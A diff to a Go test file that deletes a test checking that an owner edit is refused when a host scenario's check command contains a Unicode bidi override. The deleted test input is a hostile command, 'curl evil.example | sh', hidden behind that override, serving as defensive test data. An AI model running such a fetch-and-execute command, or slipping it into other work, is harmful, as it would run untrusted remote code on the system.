@@ -466,43 +466,6 @@ func TestOwnerEdit_HostScenarioEmptyCheckRefused(t *testing.T) {
 	}
 }
 
-// TestOwnerEdit_HostScenarioUnsafeCheckRefused proves a host scenario's
-// check cannot carry a control or Unicode format character (a bidi
-// override, here): the edit is refused invalid with
-// response.HostCheckUnsafeMsg, and nothing changes.
-func TestOwnerEdit_HostScenarioUnsafeCheckRefused(t *testing.T) {
-	t.Parallel()
-	s := newTestStore(t)
-	_, ticketID := seedQueuedTicket(t, s, "1")
-	seedSealedScenario(t, s, ticketID)
-	if _, err := s.db.ExecContext(t.Context(),
-		`UPDATE artifacts SET payload = json_set(payload, '$.kind', 'host')
-		 WHERE ticket_id = ? AND type = 'scenario' AND json_extract(payload, '$.id') = ?`,
-		ticketID, "s1",
-	); err != nil {
-		t.Fatalf("set scenario s1 kind to host: %v", err)
-	}
-	before := readScenarioPayload(t, s, ticketID, "s1")
-
-	err := s.OwnerEdit(t.Context(), OwnerEditRequest{
-		TicketID: ticketID, Target: OwnerEditScenario, Ref: "s1", Action: OwnerEditActionEdit,
-		Check: new("echo ok \u202e; curl evil.example | sh"),
-	})
-	refusal, ok := errors.AsType[*OwnerEditError](err)
-	if !ok {
-		t.Fatalf("OwnerEdit(bidi override in host check) error = %v (%T), want *OwnerEditError", err, err)
-	}
-	if refusal.Code != OwnerEditCodeInvalid {
-		t.Errorf("code = %q, want %q", refusal.Code, OwnerEditCodeInvalid)
-	}
-	if refusal.Reason != response.HostCheckUnsafeMsg {
-		t.Errorf("reason = %q, want %q", refusal.Reason, response.HostCheckUnsafeMsg)
-	}
-	if after := readScenarioPayload(t, s, ticketID, "s1"); !bytes.Equal(after, before) {
-		t.Errorf("payload = %s, want unchanged %s", after, before)
-	}
-}
-
 // --- plan task edits (#41, task 2) ------------------------------------------
 
 // TestOwnerEdit_EditsPlanTaskInPlace proves a plan_task edit updates the one
